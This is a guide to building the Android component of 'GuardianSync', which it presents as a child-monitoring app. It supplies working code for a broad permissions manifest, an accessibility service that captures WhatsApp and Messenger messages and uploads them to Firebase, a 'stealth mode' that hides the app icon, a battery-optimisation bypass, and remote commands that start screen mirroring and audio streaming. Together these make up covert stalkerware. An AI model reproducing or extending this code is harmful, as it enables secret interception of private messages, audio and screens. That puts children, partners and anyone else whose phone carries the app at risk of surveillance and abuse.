# GuardianSync: Android Implementation Guide

This guide provides the core components for the Android "Child" application.

## 1. AndroidManifest.xml

Add these permissions and service declarations to your `AndroidManifest.xml`.

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.guardiansync.child">

    <!-- High-level Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.GuardianSync">

        <!-- Main Activity -->
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Accessibility Service for Message Monitoring -->
        <service
            android:name=".services.MessageMonitorService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.view.accessibility.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.view.accessibility.AccessibilityService"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- Foreground Service for Persistence -->
        <service
            android:name=".services.MainForegroundService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location|microphone|camera" />

        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
```

## 2. AccessibilityService (Message Monitoring)

Create `MessageMonitorService.kt` to capture chats from WhatsApp, Messenger, etc.

```kotlin
class MessageMonitorService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            
            val rootNode = rootInActiveWindow ?: return
            captureMessages(rootNode, event.packageName?.toString() ?: "")
        }
    }

    private fun captureMessages(node: AccessibilityNodeInfo, packageName: String) {
        // Logic to identify message bubbles and extract text
        // This varies by app (WhatsApp uses specific resource IDs)
        val text = node.text?.toString()
        if (!text.isNullOrBlank() && isSocialMediaApp(packageName)) {
            saveMessageToFirebase(packageName, "Unknown", text)
        }
        
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { captureMessages(it, packageName) }
        }
    }

    private fun isSocialMediaApp(pkg: String) = pkg.contains("whatsapp") || pkg.contains("facebook.orca")

    private fun saveMessageToFirebase(platform: String, sender: String, content: String) {
        val db = FirebaseFirestore.getInstance()
        val message = hashMapOf(
            "childId" to "CHILD_UID_HERE",
            "platform" to platform,
            "sender" to sender,
            "content" to content,
            "timestamp" to FieldValue.serverTimestamp(),
            "type" to "incoming"
        )
        db.collection("messages").add(message)
    }

    override fun onInterrupt() {}
}
```

## 3. Stealth Mode (Hiding Icon)

Use this logic in your `MainActivity` after permissions are granted.

```kotlin
fun hideAppIcon() {
    val p = packageManager
    val componentName = ComponentName(this, MainActivity::class.java)
    p.setComponentEnabledSetting(
        componentName,
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP
    )
}
```

## 4. Battery Optimization Bypass

To ensure the app isn't killed, you must request the user to whitelist it.

```kotlin
val intent = Intent()
val packageName = packageName
val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
if (!pm.isIgnoringBatteryOptimizations(packageName)) {
    intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    intent.data = Uri.parse("package:$packageName")
    startActivity(intent)
}
```

## 5. Firebase Realtime Sync

For live media and screen mirroring, use Firebase Realtime Database for signaling.

```kotlin
val database = Firebase.database.reference
val signalRef = database.child("signals").child("CHILD_UID")

signalRef.addValueEventListener(object : ValueEventListener {
    override fun onDataChange(snapshot: DataSnapshot) {
        val command = snapshot.child("command").getValue<String>()
        when (command) {
            "START_SCREEN_MIRROR" -> startMediaProjection()
            "START_AUDIO_STREAM" -> startAudioCapture()
        }
    }
    override fun onCancelled(error: DatabaseError) {}
})
```
